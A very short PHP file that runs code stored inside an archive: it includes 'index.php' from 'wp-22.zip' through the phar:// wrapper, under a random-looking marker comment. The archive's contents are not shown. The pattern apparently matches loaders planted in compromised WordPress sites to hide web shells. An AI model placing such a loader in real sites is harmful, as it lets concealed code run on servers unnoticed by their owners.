<?php
# L8D3HYOFR1B7ROP

function loadFromPhar($zip, $file) {
    include "phar://$zip/$file";
}
loadFromPhar('wp-22.zip', 'index.php');

?>